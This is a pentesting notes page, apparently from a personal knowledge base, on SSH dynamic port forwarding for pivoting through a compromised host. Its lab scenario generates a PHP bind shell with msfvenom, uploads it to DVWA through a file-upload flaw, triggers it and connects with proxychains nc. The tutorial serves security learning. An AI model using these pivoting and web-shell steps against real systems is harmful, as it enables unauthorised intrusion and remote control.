---
author(s):
  - Userware
tags:
  - post-exploitation
  - pivot
  - port-forward
  - socks-proxy
  - living-off-the-land
  - living-off-the-foreign-land
  - linux
---
# Dynamic Port Forwarding

> [!IMPORTANT] Configuration Conditions
> In the `/etc/ssh/sshd_config`. `AllowTcpForwarding` must be enabled. Below you'll see the configuration.
> ```
$ cat /etc/ssh/sshd_config
..[omitted]..
AllowTcpForwarding yes
..[omitted]..
> ```

## 01 - Usage

Syntax usage to create a dynamic port forwarding.

```
$ ssh -D [<bind_local_IP>:]<local_SOCKS_PORT> <username>@<pivot_SSH_IP>
```

### 1.1 - Using `proxychains`

```
$ sudo echo 'socks4 127.0.0.1 <local_SOCKS_PORT>' >> /etc/proxychains4.conf

$ echo 'socks4 127.0.0.1 <local_SOCKS_PORT>' | sudo tee -a /etc/proxychains4.conf

$ proxychains firefox <target_IP>
```

### 1.2 - FoxyProxy

You can use a **FoxyProxy** firefox extension to create a pattern

![[01 - New SOCKS Proxy Configuration.png]]

Then select **SOCKS4 Proxy** that you've created.

![[02 - Select SOCKS Proxy.png]]

### 1.3 - Web Browser Network Settings

You can go to Firefox's **Network Settings**

![[03 - Firefox Network Settings.png]]

Then edit the **SOCKS Host**

![[04 - Firefox Manual Proxy Configuration.png]]

## 02 - Scenarios

### 2.1 - Bind Shell via Proxychains

TODO: Make a network topology diagram to illustrate the pivoting scenario and redo the lab

Let's say we were able to compromise the machine and got the SSH credentials and finally establish the SSH server as a foothold to start a socks proxy dynamic port forwarding 1080

```
userware@hackware-os:~$ ssh -NTfCq -D1080 vagrant@10.0.2.10
```

![[01 - Linux Machine Pivoting.png]]

Then we configure the SOCKS4/SOCKS5 through **FoxyProxy** firefox extension with the following settings

![[02 - New SOCKS Proxy Configuration.png]]

Then we choose the **SOCKS4 Proxy** to make connection to the webserver

![[03 - Select FoxyProxy Pattern.png]]

We will use the **DVWA (Damn Vulnerable Web Application)** as an example to simulate the cyber attack of the file upload vulnerability

![[04 - DVWA File Upload Webpage.png]]

We generate a PHP bind shell then we upload it.

```
userware@hackware-os:~$ msfvenom -p php/bind_php lport=8888 -f raw -o shell.php
```

![[05 - Callback Shell Uploaded.png]]

Then we must activate the PHP bind shell to start a listener of port **8888** and there are two ways to do it:

- Method 1: Navigate through the URL with FoxyProxy

Using any web browser like firefox to navigate the path of the URL.

![[06 - Navigate URL FoxyProxy.png]]

- Method 2: Proxychains with cURL

Using the `curl` command with `proxychains` to execute the webserver while pivoting.

```
userware@hackware-os:~$ proxychains curl -X GET http://192.168.56.106/dvwa/hackable/uploads/shell.php
```

It starts a listening port of **8888** that is awaiting for connection from the compromised webserver

```
$ ss -lnt
State        Recv-Q       Send-Q             Local Address:Port               Peer Address:Port       Process
LISTEN       0            128                      0.0.0.0:8888                    0.0.0.0:*
LISTEN       0            511                            *:80                            *:*
```

Establishing the bind shell to execute further commands by entering the IP address and the Port that we've generated the bind shell.

```
userware@hackware-os:~$ proxychains nc 192.168.56.106 8888
```

![[07 - Callback Shell via Proxychains.png]]

This can be tunneled with [[07 - Tactics & Techniques & Procedures (TTPs) Phases/D - Webapp Pentesting/0x00 - Payloads/Helpers/Webshells/PHP|webshells]].

---
## References

### InternalAllTheThings

- [InternalAllTheThings: Network Pivoting Techniques](https://swisskyrepo.github.io/InternalAllTheThings/redteam/pivoting/network-pivoting-techniques/)

### Certcube

- [Certcube: Pivoting and SSH Port Forwarding Basics](https://blog.certcube.com/pivoting-and-ssh-port-forwarding-basics/)

- [Certcube: Pivoting Port Forwarding](https://blog.certcube.com/pivoting-port-forwarding/)

### RawSec

- [RawSec: Overview of Network Pivoting and Tunneling](https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/)

### Anestis Bechtsoudis

- [Anestis Bechtsoudis: Using SSH Socks Proxies with MSF Reverse TCP Payloads](https://bechtsoudis.com/archive/2012/06/08/using-ssh-socks-proxies-with-msf-reverse-tcp-payloads/index.html)

### SlayerLabs

- [SlayerLabs: Tunneling Quick Guide](https://posts.slayerlabs.com/tunneling-quick-guide/)